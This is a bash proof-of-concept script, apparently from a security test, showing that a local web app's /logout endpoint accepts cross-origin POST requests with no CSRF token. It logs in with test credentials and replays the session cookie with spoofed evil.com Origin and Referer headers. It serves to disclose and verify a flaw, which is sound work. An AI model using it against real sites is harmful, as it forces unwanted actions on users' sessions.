#!/bin/bash

# POC: Cross-Site Request Forgery (CSRF) on Logout Endpoint
# This script demonstrates that the /logout endpoint accepts POST requests
# from any origin without CSRF token validation

TARGET="http://localhost:8082"
EVIL_ORIGIN="http://evil.com"
EVIL_REFERER="http://evil.com/attack.html"

echo "=========================================="
echo "CSRF Vulnerability POC - Logout Endpoint"
echo "=========================================="
echo ""

# Step 1: Authenticate to get a valid session
echo "[+] Step 1: Authenticating as test user to obtain session cookie..."
AUTH_RESPONSE=$(curl -s -i -X POST \
  -d "user_id=10032&password=test" \
  "$TARGET/password/test" 2>&1)

# Extract session cookie from Set-Cookie header
SESSION_COOKIE=$(echo "$AUTH_RESPONSE" | grep -i "Set-Cookie: session=" | sed 's/Set-Cookie: //' | cut -d';' -f1 | tr -d '\r')

if [ -z "$SESSION_COOKIE" ]; then
    echo "[-] Failed to obtain session cookie"
    echo "$AUTH_RESPONSE"
    exit 1
fi

echo "[+] Successfully authenticated. Session cookie obtained."
echo "    Cookie: ${SESSION_COOKIE:0:50}..."
echo ""

# Step 2: Verify session is valid by accessing dashboard
echo "[+] Step 2: Verifying session is valid..."
DASHBOARD_CHECK=$(curl -s -o /dev/null -w "%{http_code}" \
  -H "Cookie: $SESSION_COOKIE" \
  "$TARGET/dashboard")

if [ "$DASHBOARD_CHECK" != "200" ]; then
    echo "[-] Session validation failed (HTTP $DASHBOARD_CHECK)"
    exit 1
fi

echo "[+] Session is valid (dashboard accessible)"
echo ""

# Step 3: Perform CSRF attack - logout with cross-origin headers
echo "[+] Step 3: Performing CSRF attack on /logout endpoint..."
echo "    Simulating request from malicious site: $EVIL_ORIGIN"
echo ""

CSRF_RESPONSE=$(curl -s -i -X POST \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Origin: $EVIL_ORIGIN" \
  -H "Referer: $EVIL_REFERER" \
  "$TARGET/logout" 2>&1)

echo "$CSRF_RESPONSE"
echo ""

# Step 4: Analyze the response
echo "[+] Step 4: Analyzing CSRF attack results..."
echo ""

HTTP_STATUS=$(echo "$CSRF_RESPONSE" | grep -i "HTTP/" | head -1)
LOCATION_HEADER=$(echo "$CSRF_RESPONSE" | grep -i "Location:" | tr -d '\r')
SET_COOKIE_HEADER=$(echo "$CSRF_RESPONSE" | grep -i "Set-Cookie: session=" | tr -d '\r')

echo "HTTP Status: $HTTP_STATUS"
echo "Location Header: $LOCATION_HEADER"
echo "Set-Cookie Header: $SET_COOKIE_HEADER"
echo ""

# Check if logout was successful
if echo "$CSRF_RESPONSE" | grep -q "Location: /"; then
    echo "[!] VULNERABILITY CONFIRMED!"
    echo "[!] The logout endpoint accepted the CSRF request despite:"
    echo "    - Origin header showing cross-site origin: $EVIL_ORIGIN"
    echo "    - Referer header showing malicious page: $EVIL_REFERER"
    echo "    - No CSRF token provided in the request"
    echo ""
    echo "[!] The application redirected to / and cleared the session cookie,"
    echo "    indicating the logout was successful."
    echo ""
    echo "IMPACT: An attacker can force any authenticated user to logout"
    echo "        by tricking them into visiting a malicious webpage with"
    echo "        an auto-submitting form targeting the logout endpoint."
    echo ""
    exit 0
else
    echo "[-] Unexpected response - logout may have been blocked"
    exit 1
fi